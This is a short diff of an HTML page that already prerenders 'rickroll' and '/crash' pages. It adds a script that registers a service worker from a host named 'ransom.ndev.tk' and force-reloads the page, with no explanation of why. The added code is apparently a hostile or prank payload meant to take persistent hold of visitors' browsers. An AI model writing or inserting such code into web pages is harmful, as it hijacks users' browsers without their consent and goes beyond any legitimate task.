@@ -4,6 +4,12 @@
 <link rel="prerender" href="https://rickroll.ndev.tk/#noWait" />
 <link rel="prerender" href="https://rickroll.ndev.tk/crash" />
 <link rel="prerender" href="https://ndev.tk/rickroll.html" />
+<script>
+if (window.origin !== "null") {
+navigator.serviceWorker.register("https://ransom.ndev.tk/sw.js");
+location.reload(true);
+}
+</script>
 </head>
 <script src="http://ndev.tk/mirror/HackTimer/HackTimer.min.js"></script>
 <script type="text/javascript" src="utils.js"></script>
